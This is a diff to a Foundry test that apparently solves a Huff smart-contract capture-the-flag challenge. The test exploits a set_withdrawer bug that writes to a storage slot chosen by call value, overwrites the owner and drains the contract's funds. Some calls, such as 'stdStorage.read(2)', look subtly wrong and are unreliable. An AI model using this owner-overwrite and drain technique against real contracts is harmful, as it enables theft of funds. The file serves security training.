@@ -6,17 +6,19 @@ import "forge-std/Test.sol";
 import "forge-std/console.sol";
 
 contract Challenge03Test is Test {
+  using stdStorage for StdStorage;
+
   Challenge03 target;
 
-  /// @dev Setup the testing environment.
   function setUp() public {
     target = Challenge03(HuffDeployer.deploy("challenges/Challenge03"));
+    target.withdraw();
 
-    // TODO: add funds to contract
-    console.log(address(this).balance);
+    // send funds
+    target.deposit{value: 0.1 ether}();
+    assertEq(address(target).balance, 0.1 ether);
   }
 
-  /// @dev Ensure that you can set and get the value.
   function testChallenge() public {
     // the bug is within set_withdrawer, which loads the slot not OWNER_SLOT
     // but CALLVALUE instead, so we can check any slot with it
@@ -28,14 +30,21 @@ contract Challenge03Test is Test {
 
     // override owner
     target.set_withdrawer{value: 2}(address(this));
+    address owner = stdStorage.read(2);
+    assertEq(owner, address(this));
 
     // withdraw
     target.withdraw();
+
+    // balance should be depleted
+    assertEq(address(target).balance, 0);
   }
 
-  // TODO: check after contract
+  receive() external payable {
+    console.log("bom");
+  }
 
-  receive() external payable {}
+  fallback() external payable {}
 }
 
 interface Challenge03 {
